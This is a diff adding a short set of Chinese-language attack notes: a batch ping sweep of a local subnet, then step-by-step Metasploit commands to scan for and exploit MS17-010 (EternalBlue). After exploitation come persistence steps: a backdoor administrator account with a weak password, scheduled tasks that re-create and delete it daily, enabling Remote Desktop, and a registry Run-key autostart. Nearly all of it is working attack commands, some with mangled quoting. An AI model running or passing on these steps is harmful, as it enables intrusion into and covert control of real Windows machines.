@@ -1,0 +1,37 @@
+for /l %p in (1,1,254) do @ping -l 1 -n 1 -w 40 192.168.0.%p & if errorlevel 1 (echo 192.168.0.%p) else (echo 192.168.0.%p>>D:\\OnLine.txt)
+1.打开MSF框架
+msfconsole
+2.查找漏洞
+msf > search ms17-010
+3.使用模块
+msf > use auxiliary/scanner/smb/smb_ms17_010
+4.设置目标IP或网段
+msf auxiliary(smb_ms17_010) > set RHOSTS IP地址
+5.执行扫描
+msf auxiliary(smb_ms17_010) > run
+6.使用模块
+msf > use exploit/windows/smb/ms17_010_eternalblue
+7.查看可设置的选项
+msf exploit(ms17_010_eternalblue) > show options
+8.设置目标ip
+msf exploit(ms17_010_eternalblue) > set RHOST IP地址
+9.执行攻击
+msf exploit(ms17_010_eternalblue) > exploit
+10.创建用户名密码 User001/123456
+net user User001 123456 /add
+11.将用户blue添加入管理组
+net localgroup administrators User001 /add
+12.新建计划：每天/0点/新建用户User001
+schtasks /create /tn AddUser /sc daily /st 00:00:00 /tr "net user User001 123456 /add"
+13.新建计划：每天/5点/删除用户User001
+schtasks /create /tn DelUser /sc daily /st 05:00:00 /tr "net user User001 /del"
+14.开启远程桌面功能
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+15.远程桌面连接（新窗口）
+rdesktop IP地址:3389
+
+
+
+
+添加注册列表开机自动启动
+REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Currentversion\Run /v 名称 /t REG_SZ /d "\"文件格式"\""\"文件"\" /f
